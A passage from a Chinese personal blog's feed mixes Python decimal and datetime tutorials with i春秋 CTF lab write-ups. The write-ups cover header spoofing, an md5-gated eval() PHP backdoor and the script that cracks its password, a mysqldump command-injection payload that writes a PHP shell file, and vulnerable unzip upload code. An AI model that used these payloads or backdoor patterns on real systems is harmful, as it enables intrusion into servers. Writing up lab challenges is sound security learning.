    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="servlet" scheme="http://example.com/tags/servlet/"/>
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>py decimal库</title>
    <link href="http://example.com/2025/03/30/python/py-decimal/"/>
    <id>http://example.com/2025/03/30/python/py-decimal/</id>
    <published>2025-03-30T16:45:50.000Z</published>
    <updated>2025-04-05T11:38:59.691Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="decimal-库简介"><a href="#decimal-库简介" class="headerlink" title="decimal 库简介"></a>decimal 库简介</h2><p>decimal 是 Python 标准库中用于十进制浮点运算的模块，它提供了 Decimal 类来进行精确的十进制数学计算。与内置的 float 类型相比，Decimal 可以：</p><ul><li>精确控制精度</li><li>正确处理小数计算</li><li>消除浮点数计算中的精度误差</li></ul><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h3 id="1-创建-Decimal-对象"><a href="#1-创建-Decimal-对象" class="headerlink" title="1. 创建 Decimal 对象"></a>1. 创建 Decimal 对象</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本创建方式</span></span><br><span class="line">d1 = Decimal(<span class="string">&#x27;0.1&#x27;</span>)</span><br><span class="line">d2 = Decimal(<span class="string">&#x27;0.2&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;d1 + d2 = <span class="subst">&#123;d1 + d2&#125;</span>&quot;</span>)  <span class="comment"># 输出：0.3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对比 float</span></span><br><span class="line">f1 = <span class="number">0.1</span></span><br><span class="line">f2 = <span class="number">0.2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;f1 + f2 = <span class="subst">&#123;f1 + f2&#125;</span>&quot;</span>)  <span class="comment"># 输出：0.30000000000000004</span></span><br></pre></td></tr></table></figure></div><h3 id="2-精度控制"><a href="#2-精度控制" class="headerlink" title="2. 精度控制"></a>2. 精度控制</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置全局精度</span></span><br><span class="line">getcontext().prec = <span class="number">4</span></span><br><span class="line"><span class="built_in">print</span>(Decimal(<span class="string">&#x27;1&#x27;</span>) / Decimal(<span class="string">&#x27;3&#x27;</span>))  <span class="comment"># 输出：0.3333</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 临时改变精度</span></span><br><span class="line"><span class="keyword">with</span> localcontext() <span class="keyword">as</span> ctx:</span><br><span class="line">    ctx.prec = <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(Decimal(<span class="string">&#x27;1&#x27;</span>) / Decimal(<span class="string">&#x27;3&#x27;</span>))  <span class="comment"># 输出：0.33</span></span><br></pre></td></tr></table></figure></div><h3 id="3-四舍五入"><a href="#3-四舍五入" class="headerlink" title="3. 四舍五入"></a>3. 四舍五入</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, ROUND_HALF_UP, ROUND_DOWN</span><br><span class="line"></span><br><span class="line">num = Decimal(<span class="string">&#x27;3.14159&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 四舍五入到指定位数</span></span><br><span class="line"><span class="built_in">print</span>(num.quantize(Decimal(<span class="string">&#x27;0.01&#x27;</span>), ROUND_HALF_UP))  <span class="comment"># 输出：3.14</span></span><br><span class="line"><span class="built_in">print</span>(num.quantize(Decimal(<span class="string">&#x27;0.1&#x27;</span>), ROUND_HALF_UP))   <span class="comment"># 输出：3.1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 向下取整</span></span><br><span class="line"><span class="built_in">print</span>(num.quantize(Decimal(<span class="string">&#x27;0.01&#x27;</span>), ROUND_DOWN))     <span class="comment"># 输出：3.14</span></span><br></pre></td></tr></table></figure></div><h3 id="4-数学运算"><a href="#4-数学运算" class="headerlink" title="4. 数学运算"></a>4. 数学运算</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"></span><br><span class="line">a = Decimal(<span class="string">&#x27;1.5&#x27;</span>)</span><br><span class="line">b = Decimal(<span class="string">&#x27;2.5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本运算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;加法：<span class="subst">&#123;a + b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;减法：<span class="subst">&#123;a - b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;乘法：<span class="subst">&#123;a * b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;除法：<span class="subst">&#123;a / b&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取整和余数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;向下取整：<span class="subst">&#123;a.floor()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;向上取整：<span class="subst">&#123;b.ceil()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;取余：<span class="subst">&#123;a % b&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h2 id="常用方法和属性"><a href="#常用方法和属性" class="headerlink" title="常用方法和属性"></a>常用方法和属性</h2><table><thead><tr><th>方法&#x2F;属性</th><th>说明</th></tr></thead><tbody><tr><td>as_tuple()</td><td>返回数值的元组表示</td></tr><tr><td>quantize()</td><td>设置小数位数</td></tr><tr><td>normalize()</td><td>规范化表示</td></tr><tr><td>is_finite()</td><td>检查是否为有限数</td></tr><tr><td>is_infinite()</td><td>检查是否为无穷大</td></tr><tr><td>is_nan()</td><td>检查是否为 NaN</td></tr></tbody></table><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>Decimal 对象之间可以进行算术运算，但不能直接与 float 类型混合运算</li><li>使用字符串初始化 Decimal 对象可以避免浮点数精度问题</li><li>设置全局精度会影响所有后续的计算</li><li>在金融计算等需要精确小数计算的场景中，应优先使用 Decimal</li></ul><h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><ol><li><p>金融计算</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"></span><br><span class="line">price = Decimal(<span class="string">&#x27;19.99&#x27;</span>)</span><br><span class="line">tax_rate = Decimal(<span class="string">&#x27;0.15&#x27;</span>)</span><br><span class="line">quantity = Decimal(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">total = price * quantity</span><br><span class="line">tax = total * tax_rate</span><br><span class="line">final_price = total + tax</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;总价：<span class="subst">&#123;final_price&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div></li><li><p>科学计算</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="number">50</span>  <span class="comment"># 设置高精度</span></span><br><span class="line">pi = Decimal(<span class="string">&#x27;3.14159265358979323846264338327950288419716939937510&#x27;</span>)</span><br><span class="line">radius = Decimal(<span class="string">&#x27;2.5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">area = pi * radius * radius</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;圆的面积：<span class="subst">&#123;area&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="python" scheme="http://example.com/categories/python/"/>
    
    
    <category term="py库" scheme="http://example.com/tags/py%E5%BA%93/"/>
    
    <category term="decimal" scheme="http://example.com/tags/decimal/"/>
    
  </entry>
  
  <entry>
    <title>py datetime库</title>
    <link href="http://example.com/2025/03/30/python/py-datetime/"/>
    <id>http://example.com/2025/03/30/python/py-datetime/</id>
    <published>2025-03-30T16:38:50.000Z</published>
    <updated>2025-04-05T11:38:59.691Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="datetime-库简介"><a href="#datetime-库简介" class="headerlink" title="datetime 库简介"></a>datetime 库简介</h2><p>datetime 是 Python 内置的日期和时间处理库，提供了处理日期和时间的类和函数。主要包含以下常用类：</p><ul><li>datetime：同时包含日期和时间信息</li><li>date：仅包含日期信息</li><li>time：仅包含时间信息</li><li>timedelta：表示时间间隔</li></ul><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h3 id="1-获取当前日期和时间"><a href="#1-获取当前日期和时间" class="headerlink" title="1. 获取当前日期和时间"></a>1. 获取当前日期和时间</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前日期和时间</span></span><br><span class="line">now = datetime.now()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;当前时间：<span class="subst">&#123;now&#125;</span>&quot;</span>)  <span class="comment"># 输出格式如：2025-03-30 16:38:50.123456</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取年、月、日、时、分、秒</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;年：<span class="subst">&#123;now.year&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;月：<span class="subst">&#123;now.month&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;日：<span class="subst">&#123;now.day&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;时：<span class="subst">&#123;now.hour&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;分：<span class="subst">&#123;now.minute&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;秒：<span class="subst">&#123;now.second&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h3 id="2-日期格式化"><a href="#2-日期格式化" class="headerlink" title="2. 日期格式化"></a>2. 日期格式化</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">now = datetime.now()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将日期转换为字符串</span></span><br><span class="line">date_str = now.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;格式化日期：<span class="subst">&#123;date_str&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字符串转换为日期</span></span><br><span class="line">date_obj = datetime.strptime(<span class="string">&quot;2025-03-30 16:38:50&quot;</span>, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;解析的日期：<span class="subst">&#123;date_obj&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h3 id="3-日期计算"><a href="#3-日期计算" class="headerlink" title="3. 日期计算"></a>3. 日期计算</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta</span><br><span class="line"></span><br><span class="line">now = datetime.now()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 日期加减</span></span><br><span class="line">tomorrow = now + timedelta(days=<span class="number">1</span>)</span><br><span class="line">yesterday = now - timedelta(days=<span class="number">1</span>)</span><br><span class="line">next_hour = now + timedelta(hours=<span class="number">1</span>)</span><br><span class="line">last_week = now - timedelta(weeks=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;明天：<span class="subst">&#123;tomorrow&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;昨天：<span class="subst">&#123;yesterday&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;一小时后：<span class="subst">&#123;next_hour&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;上周：<span class="subst">&#123;last_week&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h3 id="4-时区处理"><a href="#4-时区处理" class="headerlink" title="4. 时区处理"></a>4. 时区处理</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> pytz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建时区对象</span></span><br><span class="line">tz_utc = pytz.UTC</span><br><span class="line">tz_cn = pytz.timezone(<span class="string">&#x27;Asia/Shanghai&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前时区的时间</span></span><br><span class="line">cn_time = datetime.now(tz_cn)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;中国时间：<span class="subst">&#123;cn_time&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 时区转换</span></span><br><span class="line">utc_time = cn_time.astimezone(tz_utc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;UTC时间：<span class="subst">&#123;utc_time&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><h2 id="常用格式化符号"><a href="#常用格式化符号" class="headerlink" title="常用格式化符号"></a>常用格式化符号</h2><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>%Y</td><td>年份（如：2025）</td></tr><tr><td>%m</td><td>月份（01-12）</td></tr><tr><td>%d</td><td>日期（01-31）</td></tr><tr><td>%H</td><td>24小时制（00-23）</td></tr><tr><td>%I</td><td>12小时制（01-12）</td></tr><tr><td>%M</td><td>分钟（00-59）</td></tr><tr><td>%S</td><td>秒（00-59）</td></tr><tr><td>%f</td><td>微秒（000000-999999）</td></tr><tr><td>%A</td><td>星期几的完整名称</td></tr><tr><td>%a</td><td>星期几的简写</td></tr><tr><td>%B</td><td>月份名称</td></tr><tr><td>%b</td><td>月份简写</td></tr></tbody></table><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>datetime 对象是不可变的（immutable）</li><li>进行时区操作时需要安装 pytz 库：<code>pip install pytz</code></li><li>在处理时区时，建议始终使用 aware datetime（包含时区信息的datetime对象）</li><li>在数据库操作中，建议统一使用 UTC 时间，展示时再转换为本地时间</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="python" scheme="http://example.com/categories/python/"/>
    
    
    <category term="datetime" scheme="http://example.com/tags/datetime/"/>
    
    <category term="py库" scheme="http://example.com/tags/py%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>禁止访问</title>
    <link href="http://example.com/2025/03/29/web/ichunqiu/%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE/"/>
    <id>http://example.com/2025/03/29/web/ichunqiu/%E7%A6%81%E6%AD%A2%E8%AE%BF%E9%97%AE/</id>
    <published>2025-03-29T22:38:43.000Z</published>
    <updated>2025-04-05T11:38:59.691Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>抓个包</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 29 Mar 2025 14:55:23 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 463</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Powered-By: PHP/7.2.34</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;禁止访问&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;index.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;h1&gt;403 Forbidden&lt;/h1&gt;</span><br><span class="line">        &lt;p&gt;You are not authorized to access this resource.&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;If you think this is a mistake, please contact the website administrator.&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;!-- error client-ip, plz use 192.168.*.* --&gt;</span><br></pre></td></tr></table></figure></div><p>我们看到</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- error client-ip, plz use 192.168.*.* --&gt;</span><br></pre></td></tr></table></figure></div><p>用burp爆，后两位从1-255遍历</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: eci-2ze7s4z2n49ytjonezu9.cloudeci1.ichunqiu.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line">X-Forwarded-For: 192.168.§1§.§1§</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure></div><p>什么东西都没有（</p><p>又审了一遍<br>考虑用Client-IP</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: eci-2ze7s4z2n49ytjonezu9.cloudeci1.ichunqiu.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36</span><br><span class="line">Client-IP: 192.168.§1§.§1§</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>这回爆出来了,tm的居然192.168.1.1</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 29 Mar 2025 15:06:06 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 460</span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Powered-By: PHP/7.2.34</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;禁止访问&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;index.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;h1&gt;403 Forbidden&lt;/h1&gt;</span><br><span class="line">        &lt;p&gt;You are not authorized to access this resource.&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;If you think this is a mistake, please contact the website administrator.&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">flag&#123;b0f38231-f0d4-4144-ad49-f82d4b684a76&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="i春秋靶场" scheme="http://example.com/categories/i%E6%98%A5%E7%A7%8B%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="ssrf" scheme="http://example.com/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>遗留的压缩包</title>
    <link href="http://example.com/2025/03/29/web/ichunqiu/%E9%81%97%E7%95%99%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/"/>
    <id>http://example.com/2025/03/29/web/ichunqiu/%E9%81%97%E7%95%99%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/</id>
    <published>2025-03-29T22:34:52.000Z</published>
    <updated>2025-04-05T11:38:59.691Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>题目中有压缩包，考虑到<a class="link"   href="http://www.zip/" >www.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>访问<a class="link"   href="http://www.zip发现居然真的有/" >www.zip发现居然真的有 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>1337.php</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># leet</span><br><span class="line">if(md5($_GET[&#x27;pwd&#x27;])==&#x27;217f81b8ff0a1ab138a8e1bdc031262e&#x27;)&#123;</span><br><span class="line">   eval($_POST[&#x27;1337&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>明显是md5碰撞<br>猜测pwd复杂度不高<br>戳个py脚本</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import product</span><br><span class="line"></span><br><span class="line">def find_md5(target_hash, max_length=4):</span><br><span class="line">    chars = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span><br><span class="line">    </span><br><span class="line">    def calculate_md5(text):</span><br><span class="line">        return hashlib.md5(text.encode()).hexdigest()</span><br><span class="line">    </span><br><span class="line">    for length in range(1, max_length + 1):</span><br><span class="line">        for guess in product(chars, repeat=length):</span><br><span class="line">            candidate = &#x27;&#x27;.join(guess)</span><br><span class="line">            if calculate_md5(candidate) == target_hash:</span><br><span class="line">                return candidate</span><br><span class="line">            </span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line">target = &#x27;217f81b8ff0a1ab138a8e1bdc031262e&#x27;</span><br><span class="line">result = find_md5(target)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure></div><p>爆出来leet<br>然后就是命令执行了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="i春秋靶场" scheme="http://example.com/categories/i%E6%98%A5%E7%A7%8B%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="hash" scheme="http://example.com/tags/hash/"/>
    
  </entry>
  
  <entry>
    <title>dumpit</title>
    <link href="http://example.com/2025/03/27/web/ichunqiu/dumpit/"/>
    <id>http://example.com/2025/03/27/web/ichunqiu/dumpit/</id>
    <published>2025-03-27T17:10:52.000Z</published>
    <updated>2025-04-05T11:38:59.691Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>扫了一遍，没东西.<br>题目是这个玩意</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">use ?db=&amp;table_2_query= or ?db=&amp;table_2_dump= to view the tables! etc:?db=ctf&amp;table_2_query=flag1</span><br></pre></td></tr></table></figure></div><p>随便按照上面的提示进行输入</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?db=ctf&amp;table_2_query=flag1</span><br></pre></td></tr></table></figure></div><p>尝试sql发现没有注入<br>然后我不会了</p><p>查到<br>?db&#x3D;&amp;table_2_dump&#x3D; 估计调⽤的是 mysqldump 之类的命令, 存在命令注⼊<br>–result-file  filename可以用来指定生成文件</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?db=&quot;&lt;?=phpinfo()?&gt;&quot; --result-file shell.php&amp;table_2_dump=flag1</span><br></pre></td></tr></table></figure></div><p>在phpinfo里面找到flag即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="i春秋靶场" scheme="http://example.com/categories/i%E6%98%A5%E7%A7%8B%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>unzip</title>
    <link href="http://example.com/2025/03/27/web/ichunqiu/unzip/"/>
    <id>http://example.com/2025/03/27/web/ichunqiu/unzip/</id>
    <published>2025-03-27T16:51:52.000Z</published>
    <updated>2025-04-05T11:38:59.691Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>有个upload.php</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line">  error_reporting(0); </span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line"></span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE); </span><br><span class="line"></span><br><span class="line">if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#x27;application/zip&#x27;)&#123;  </span><br><span class="line">    //这里是验证MIME值，确定上传的文件类型为zip，同时也为我们指明了方向，要上传一个zip压缩包。</span><br><span class="line">    </span><br><span class="line">    exec(&#x27;cd /tmp &amp;&amp; unzip -o &#x27; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]); </span><br><span class="line">  //这里的意思是进入/tmp目录下，然后调用unzip命令对压缩包进行解压，也就是把压缩包解压到/tmp目录下。  </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//only 